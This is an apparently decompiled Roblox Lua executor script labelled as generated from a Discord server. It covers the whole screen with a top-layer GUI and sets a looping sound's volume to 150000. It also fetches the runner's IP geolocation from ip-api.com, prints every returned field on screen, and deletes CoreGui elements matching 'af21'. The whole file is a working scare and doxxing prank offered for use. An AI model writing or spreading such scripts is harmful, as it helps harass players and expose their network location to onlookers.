-- This file was generated at discord.gg/syncrypt

local sourceEnvironment = (getfenv and getfenv()) or _ENV
local up24 = {}
up24["1"] = Instance.new("ScreenGui", game.CoreGui)
local v451 = up24["1"]
v451.IgnoreGuiInset = true
local v461 = up24["1"]
v461.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
local v482 = up24["1"]
v482.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local v503 = up24["1"]
v503.ResetOnSpawn = false
up24["2"] = Instance.new("Frame", up24["1"])
local v535 = up24["2"]
v535.Active = true
local v545 = up24["2"]
v545.ZIndex = 1000000000
local v555 = up24["2"]
v555.BorderSizePixel = 0
local v565 = up24["2"]
v565.SelectionOrder = 1000000000
local v575 = up24["2"]
v575.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
local v592 = up24["2"]
v592.ClipsDescendants = true
local v602 = up24["2"]
v602.Size = UDim2.new(1, 0, 1, 0)
local v619 = up24["2"]
v619.BorderColor3 = Color3.fromRGB(0, 0, 0)
up24["3"] = Instance.new("Sound", up24["2"])
local v658 = up24["3"]
v658.PlaybackSpeed = .18
local v668 = up24["3"]
v668.Volume = 10
local v678 = up24["3"]
v678.Looped = true
local v688 = up24["3"]
v688.RollOffMode = Enum.RollOffMode.InverseTapered
local v709 = up24["3"]
v709.SoundId = "rbxassetid://115190083295451"
up24["4"] = Instance.new("LocalScript", up24["3"])
up24["5"] = Instance.new("TextLabel", up24["2"])
local v767 = up24["5"]
v767.TextWrapped = true
local v777 = up24["5"]
v777.Active = true
local v787 = up24["5"]
v787.ZIndex = 1000000000
local v797 = up24["5"]
v797.BorderSizePixel = 0
local v807 = up24["5"]
v807.TextSize = 14
local v817 = up24["5"]
v817.SelectionOrder = 1000000000
local v827 = up24["5"]
v827.TextScaled = true
local v837 = up24["5"]
v837.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
local v854 = up24["5"]
v854.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
local v897 = up24["5"]
v897.TextColor3 = Color3.fromRGB(255, 255, 255)
local v914 = up24["5"]
v914.BackgroundTransparency = 1
local v924 = up24["5"]
v924.AnchorPoint = Vector2.new(0.5, 0.5)
local v941 = up24["5"]
v941.Size = UDim2.new(.47773, 0, .87016, 0)
local v958 = up24["5"]
v958.ClipsDescendants = true
local v968 = up24["5"]
v968.BorderColor3 = Color3.fromRGB(0, 0, 0)
local v985 = up24["5"]
v985.Position = UDim2.new(.50565, 0, .49319, 0)
up24["6"] = Instance.new("LocalScript", up24["5"])
up24["7"] = Instance.new("UIStroke", up24["5"])
up24["8"] = Instance.new("ImageLabel", up24["2"])
local v1068 = up24["8"]
v1068.BorderSizePixel = 0
local v1078 = up24["8"]
v1078.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
local v1095 = up24["8"]
v1095.ImageTransparency = .77
local v1105 = up24["8"]
v1105.AnchorPoint = Vector2.new(0.5, 0.5)
local v1122 = up24["8"]
v1122.Image = "rbxassetid://6862780932"
local v1136 = up24["8"]
v1136.Size = UDim2.new(.69233, 0, .83078, 0)
local v1153 = up24["8"]
v1153.BorderColor3 = Color3.fromRGB(0, 0, 0)
local v1170 = up24["8"]
v1170.BackgroundTransparency = 1
local v1180 = up24["8"]
v1180.Position = UDim2.new(0.5, 0, 0.5, 0)
up24["9"] = Instance.new("LocalScript", up24["8"])
local v1214 = function()
    local v150 = up24["4"]
    v150.Parent:play()
    local v147 = v150.Parent
    v147.Volume = 150000
    return
end
task.spawn(v1214)
local v1221 = function()
    local v175, v184, v188, v191, v192
    local v198, v199, v200, v201, v202, v203, v204, v222
    local v235, v236, v237, v238, v239, v255
    local v169 = up24["6"]
    local v180 = (game:HttpGet("http://ip-api.com/json/"))
    if v180 then
        v175 = game
        v192 = v175.GetService(v175, "HttpService"):JSONDecode(v180)
        v184 = ""
        v198, v199, v200 = pairs(v192)
        v191 = v200
        v188 = v198
        v201 = v199
        while true do
            v202, v203 = v188(v201, v191)
            v204 = v203
            v191 = v202
            if not v191 then
                break
            end
            v184 = (v184 .. (v191 .. (" : " .. ((tostring(v204)) .. "\n"))))
        end
        v222 = v169.Parent
        v222.Text = v184
    end
    v235, v236, v237 = pairs(game.CoreGui:GetDescendants())
    v201 = v236
    v191 = v237
    v184 = v235
    while true do
        v238, v239 = v184(v201, v191)
        v188 = v239
        v191 = v238
        if not v191 then
            break
        end
        v255 = string.find(v188.Name, "af21")
        if v255 then
            v188:Destroy()
        end
    end
    local v260 = sourceEnvironment.l1dPNmSZdqnh
    return
end
task.spawn(v1221)
local v1228 = function()
    local v274, v288
    local v267 = up24["9"]
    while true do
        wait()
        v274 = v267.Parent
        v288 = v267.Parent.Rotation
        v274.Rotation = (v288 + 1)
    end
end
task.spawn(v1228)

return up24["1"], require
